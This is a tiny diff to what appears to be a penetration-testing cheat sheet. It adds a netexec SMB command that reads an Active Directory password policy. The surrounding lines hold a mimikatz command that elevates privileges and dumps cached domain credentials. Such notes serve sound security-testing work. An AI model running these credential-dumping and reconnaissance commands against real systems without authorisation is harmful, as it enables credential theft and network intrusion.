@@ -3575,5 +3575,9 @@ lsadump::cache
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"
 ```
 
+get password policy for AD
+```
+netexec smb $ipa --pass-pol
+```
 
 
